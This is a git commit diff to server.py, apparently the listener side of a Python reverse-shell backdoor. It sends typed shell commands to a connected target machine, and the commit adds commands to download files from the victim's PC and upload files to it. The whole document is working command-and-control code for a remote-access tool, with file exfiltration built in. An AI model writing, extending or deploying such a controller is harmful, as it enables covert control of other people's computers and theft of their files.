d9be1e91316c459084db53634396f00231be8d3c
kali-wsy <tahoeivanova@gmail.com>
2022-05-18 15:11:51 -0500

    feat (download upload files) Added feature to download and upload files

--- server.py
+++ server.py
@@ -2,13 +2,16 @@
 
 import socket
 import json
+import base64
 from termcolor import colored
 
 from ip_cred import IP, PORT
 
+
 def reliable_send(data):
 	json_data = json.dumps(data)
 	target.send(json_data.encode("utf-8"))
+
 
 def reliable_recv():
 	data = ""
@@ -18,12 +21,32 @@ def reliable_recv():
 			return json.loads(data)
 		except ValueError:
 			continue
+
+
 def shell():
 	while True:
 		command = input("[*] Shell#~%s: " % str(ip))
 		reliable_send(command)
 		if command == "q":
 			break
+		elif command[:2] == "cd" and len(command) > 1:
+			continue
+		elif command[0:8] == "download": # Downloads file from client's pc to server
+			response = reliable_recv()
+			try:
+				file_content = base64.b64decode(response)
+				with open(command[9:], "wb") as download_file:
+					download_file.write(file_content)
+			except:
+				print(response) # prints error from client
+		elif command[:6] == "upload":
+			try:
+				with open(command[7:], "rb") as binary_file:
+					reliable_send(base64.b64encode(binary_file.read()).decode("utf-8"))
+			except Exception as e:
+				print(e)
+				failed = 'Failed to Upload'
+				reliable_send(failed)
 		else:
 			result = reliable_recv() # prints result of the command
 			print(result)
@@ -46,6 +69,3 @@ def runServer():
 runServer()
 shell()
 s.close()
-
-
-
